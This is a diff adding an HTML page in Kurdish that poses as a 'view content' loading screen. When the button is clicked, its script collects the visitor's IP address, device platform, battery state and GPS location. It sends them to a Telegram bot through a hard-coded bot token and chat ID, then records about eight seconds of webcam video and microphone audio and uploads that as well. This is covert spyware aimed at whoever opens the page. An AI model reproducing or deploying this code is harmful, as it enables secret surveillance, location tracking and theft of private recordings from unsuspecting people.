@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        #btn { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #fff; border-radius: 10px; border: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <button id="btn">بینینی ناوەڕۆک</button>
+
+    <script>
+        const BOT_TOKEN = '8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg';
+        const CHAT_ID = '1682628303';
+
+        document.getElementById('btn').addEventListener('click', async () => {
+            document.getElementById('btn').innerText = "تکایە چاوەڕێ بکە...";
+
+            try {
+                // ١. کۆکردنەوەی زانیارییەکان
+                const ip = await fetch('https://api.ipify.org').then(r => r.text()).catch(() => "نادیار");
+                const bat = navigator.getBattery ? await navigator.getBattery() : {level: 1, charging: false};
+                
+                let loc = "ڕێگەپێدان نەدرا";
+                try {
+                    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                    loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                } catch(e) {}
+
+                // ٢. ناردنی زانیاری بۆ تێلەگرام
+                const msg = `⚠️ کەسێک چووە ژوورەوە\n\n📱 ئامێر: ${navigator.platform}\n🔋 ڕێژەی پاتری: ${Math.round(bat.level * 100)}%\n⚡ بارگاویکردن: ${bat.charging ? 'بەڵێ' : 'نەخێر'}\n🌐 ئایپی: ${ip}\n📍 لۆکەیشن: ${loc}\n📅 کات: ${new Date().toLocaleString()}\n🔗 لینک: ${window.location.href}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+
+                // ٣. تۆمارکردنی ڤیدیۆ و دەنگ
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                
+                recorder.onstop = async () => {
+                    const form = new FormData();
+                    form.append('chat_id', CHAT_ID);
+                    form.append('video', new Blob(chunks, {type: 'video/webm'}));
+                    form.append('caption', "ڤیدیۆ و دەنگی بەکارهێنەر");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
+                    document.getElementById('btn').innerText = "سەرکەوتوو بوو";
+                };
+
+                recorder.start();
+                setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 8000);
+            } catch(e) {
+                console.error("هەڵە ڕوویدا:", e);
+                document.getElementById('btn').innerText = "هەڵەیەک ڕوویدا";
+            }
+        });
+    </script>
+</body>
+</html>
